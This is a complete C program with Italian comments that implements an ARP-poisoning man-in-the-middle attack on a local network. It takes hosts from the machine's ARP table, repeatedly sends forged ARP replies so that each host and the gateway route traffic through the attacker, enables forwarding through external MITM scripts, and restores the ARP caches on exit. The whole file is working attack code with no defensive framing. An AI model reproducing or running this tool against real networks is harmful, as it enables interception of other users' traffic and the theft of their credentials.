#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <sys/wait.h>

// ============================================================
// STATO GLOBALE
// ============================================================

// Cache degli host risolti: IP + MAC già noti.
struct host {
    uint8_t ip[4];
    uint8_t mac[6];
};
static struct host hosts[256];
static int         n_hosts = 0;

static int      sock = -1;
static char    *iface = NULL;
static uint8_t  my_mac[6], my_ip[4];
static uint8_t  gw_mac[6], gw_ip[4];

static volatile int running = 1;

#define START_SCRIPT "FORWARDING/start_mitm.sh"
#define STOP_SCRIPT  "FORWARDING/stop_mitm.sh"

// ============================================================
// STRUTTURE
// ============================================================

struct frame {
    uint8_t  eth_dst[6], eth_src[6];
    uint16_t eth_type;
    uint16_t arp_htype, arp_ptype;
    uint8_t  arp_hlen, arp_plen;
    uint16_t arp_oper;
    uint8_t  arp_sha[6], arp_spa[4], arp_tha[6], arp_tpa[4];
} __attribute__((packed));

// ============================================================
// UTILITY
// ============================================================

static char* convert_mac(const uint8_t *m) {
    char *buf;
    if (asprintf(&buf, "%02x:%02x:%02x:%02x:%02x:%02x",
                 m[0], m[1], m[2], m[3], m[4], m[5]) < 0)
        return NULL;
    return buf;
}

static char* convert_ip(const uint8_t *ip) {
    struct in_addr a;
    char tmp[INET_ADDRSTRLEN];
    memcpy(&a, ip, 4);
    inet_ntop(AF_INET, &a, tmp, sizeof(tmp));
    char *buf;
    if (asprintf(&buf, "%s", tmp) < 0) return NULL;
    return buf;
}

static void on_sigint(int sig) {
    (void)sig;
    running = 0;
}

// ============================================================
// INFO DI RETE
// ============================================================

static int get_iface_mac(const char *ifname, uint8_t *out) {
    char path[128];
    snprintf(path, sizeof(path), "/sys/class/net/%s/address", ifname);
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    unsigned int m[6];
    int n = fscanf(f, "%x:%x:%x:%x:%x:%x",
                   &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]);
    fclose(f);
    if (n != 6) return -1;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)m[i];
    return 0;
}

static int get_iface_ip(const char *ifname, uint8_t *out) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) { close(s); return -1; }
    close(s);
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy(out, &sin->sin_addr, 4);
    return 0;
}

// ============================================================
// IP FORWARDING
// ============================================================

static int avvia_ipForwarding(void) {
    int ret = system("sh " START_SCRIPT);
    if (ret == -1) {
        perror("system start_mitm");
        return -1;
    }
    if (!WIFEXITED(ret) || WEXITSTATUS(ret) != 0) {
        fprintf(stderr, "start_mitm.sh fallito (ret=%d)\n", ret);
        return -1;
    }
    return 0;
}

static int ferma_ipForwarding(void) {
    int ret = system("sh " STOP_SCRIPT);
    if (ret == -1) {
        perror("system stop_mitm");
        return -1;
    }
    if (!WIFEXITED(ret) || WEXITSTATUS(ret) != 0) {
        fprintf(stderr, "stop_mitm.sh fallito (ret=%d)\n", ret);
        return -1;
    }
    return 0;
}

// ============================================================
// PRIMITIVE ARP
// ============================================================

static void send_arp(uint8_t *eth_dst, uint8_t *sha, uint8_t *spa,
                     uint8_t *tha,     uint8_t *tpa, uint16_t op) {
    struct frame f;
    memset(&f, 0, sizeof(f));

    if (eth_dst) memcpy(f.eth_dst, eth_dst, 6);
    if (sha)     memcpy(f.eth_src, sha, 6);
    f.eth_type  = htons(ETH_P_ARP);

    f.arp_htype = htons(1);
    f.arp_ptype = htons(0x0800);
    f.arp_hlen  = 6;
    f.arp_plen  = 4;
    f.arp_oper  = htons(op);

    if (sha) memcpy(f.arp_sha, sha, 6);
    if (spa) memcpy(f.arp_spa, spa, 4);
    if (tha) memcpy(f.arp_tha, tha, 6);
    if (tpa) memcpy(f.arp_tpa, tpa, 4);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family   = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex  = if_nametoindex(iface);
    sa.sll_halen    = 6;
    if (eth_dst) memcpy(sa.sll_addr, eth_dst, 6);

    sendto(sock, &f, sizeof(f), 0, (struct sockaddr *)&sa, sizeof(sa));
}

static int get_mac(uint8_t *ip, uint8_t *out_mac) {
    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    send_arp(bcast, my_mac, my_ip, NULL, ip, 1);

    uint8_t buf[1024];
    while (recv(sock, buf, sizeof(buf), 0) >= 42) {
        struct frame *f = (struct frame *)buf;
        if (ntohs(f->eth_type) == ETH_P_ARP &&
            ntohs(f->arp_oper) == 2 &&
            memcmp(f->arp_spa, ip, 4) == 0) {
            memcpy(out_mac, f->arp_sha, 6);
            return 0;
        }
    }
    return -1;
}

static void poison(uint8_t *target_mac, uint8_t *target_ip,
                   uint8_t *host_ip,    uint8_t *host_mac) {
    send_arp(target_mac, host_mac, host_ip, target_mac, target_ip, 2);
}

static void arpPoisoner(struct host *h) {
    poison(h->mac, h->ip, gw_ip,  my_mac);
    poison(gw_mac, gw_ip, h->ip,  my_mac);
}

static void arpRestorer(struct host *h) {
    for (int i = 0; i < 7; i++) {
        poison(h->mac, h->ip, gw_ip,  gw_mac);
        poison(gw_mac, gw_ip, h->ip,  h->mac);
        usleep(200000);
    }
}

// ============================================================
// SCANNER (ARP table based)
// ============================================================

static void scan_subnet_arp(void) {
    n_hosts = 0;
    FILE *f = fopen("/proc/net/arp", "r");
    if (!f) { perror("fopen /proc/net/arp"); return; }

    char line[256];
    // Salta l'header
    if (fgets(line, sizeof(line), f) == NULL) { fclose(f); return; }

    while (fgets(line, sizeof(line), f)) {
        char ip_str[16], hw_type[16], flags[16], mac_str[18], mask[16], dev[16];
        if (sscanf(line, "%15s %15s %15s %17s %15s %15s",
                   ip_str, hw_type, flags, mac_str, mask, dev) == 6) {
            
            if (strcmp(dev, iface) != 0) continue;
            if (strcmp(mac_str, "00:00:00:00:00:00") == 0) continue;

            uint8_t ip[4];
            if (inet_pton(AF_INET, ip_str, ip) != 1) continue;
            if (memcmp(ip, my_ip, 4) == 0) continue;
            if (memcmp(ip, gw_ip, 4) == 0) continue; // Salta il gateway

            uint8_t mac[6];
            unsigned int m[6];
            if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                for (int i = 0; i < 6; i++) mac[i] = (uint8_t)m[i];
                memcpy(hosts[n_hosts].ip, ip, 4);
                memcpy(hosts[n_hosts].mac, mac, 6);
                n_hosts++;
                char *ip_s = convert_ip(ip);
                printf("[*] Trovato: %s (%s)\n", ip_s, mac_str);
                free(ip_s);
            }
        }
    }
    fclose(f);
    printf("[CACHE] %d host trovati in /proc/net/arp\n", n_hosts);
}

// ============================================================
// PROCESS / RESTORE
// ============================================================

static void process_ips(void) {
    for (int i = 0; i < n_hosts; i++) {
        arpPoisoner(&hosts[i]);
    }
}

static void restore_ips(void) {
    for (int i = 0; i < n_hosts; i++) {
        arpRestorer(&hosts[i]);
    }
}

static int flush_arp_cache(const char *iface) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "ip neigh flush dev %s", iface);

    int ret = system(cmd);
    if (ret == -1) {
        perror("system ip neigh flush");
        return -1;
    }
    if (!WIFEXITED(ret) || WEXITSTATUS(ret) != 0) {
        fprintf(stderr, "ip neigh flush fallito (ret=%d)\n", ret);
        return -1;
    }
    return 0;
}

static void riscalda_arp(const char *iface, const char *gateway_ip) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
             "ping -c 1 -W 2 %s > /dev/null 2>&1", gateway_ip);
    system(cmd);
    usleep(200 * 1000);
}

// ============================================================
// MAIN
// ============================================================

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "uso: %s <iface> <gateway_ip>   (es. wlan0 192.168.1.1)\n",
                argv[0]);
        return 1;
    }
    iface = argv[1];

    signal(SIGINT, on_sigint);

    // 1) MAC e IP dell'interfaccia
    if (get_iface_mac(iface, my_mac) < 0 ||
        get_iface_ip(iface, my_ip) < 0) {
        fprintf(stderr, "impossibile leggere MAC/IP di %s\n", iface);
        return 1;
    }
    char *my_mac_s = convert_mac(my_mac);
    char *my_ip_s  = convert_ip(my_ip);
    printf("[*] iface=%s  mio MAC=%s  mio IP=%s\n",
           iface, my_mac_s ? my_mac_s : "?", my_ip_s ? my_ip_s : "?");
    free(my_mac_s); free(my_ip_s);

    // 2) Gateway
    if (inet_pton(AF_INET, argv[2], gw_ip) != 1) {
        fprintf(stderr, "gateway IP non valido: %s\n", argv[2]);
        return 1;
    }
    char *gw_ip_s = convert_ip(gw_ip);
    printf("[*] gateway IP=%s\n", gw_ip_s ? gw_ip_s : "?");
    
    // BUG FIX: usiamo argv[2] invece di gw_ip_s che stiamo per liberare
    riscalda_arp(iface, argv[2]); 
    free(gw_ip_s);

    // 3) Socket raw
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = if_nametoindex(iface);
    if (bind(sock, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind"); return 1;
    }

    struct timeval tv = {2, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // 4) MAC del gateway
    if (get_mac(gw_ip, gw_mac) < 0) {
        fprintf(stderr, "gateway non risponde ad ARP\n");
        return 1;
    }
    char *gw_mac_s = convert_mac(gw_mac);
    printf("[*] gateway MAC=%s\n", gw_mac_s ? gw_mac_s : "?");
    free(gw_mac_s);

    // 5) Leggi la tabella ARP locale per trovare i target
    printf("[*] lettura tabella ARP in corso...\n");
    scan_subnet_arp();

    if (n_hosts == 0) {
        fprintf(stderr, "nessun host trovato in /proc/net/arp, esco\n");
        close(sock);
        return 1;
    }

    flush_arp_cache(iface);

    avvia_ipForwarding();

    // 6) Loop di poisoning
    printf("[*] avvio loop di poisoning (CTRL+C per fermare)\n");
    while (running) {
        process_ips();
        sleep(2);
    }

    printf("\n[*] stop.\n");

    // 7) Ripristino cache ARP
    printf("[*] ripristino cache ARP...\n");
    restore_ips();

    close(sock);

    printf("[*] disattivo IP forwarding...\n");
    ferma_ipForwarding();

    printf("[*] done.\n");
    return 0;
}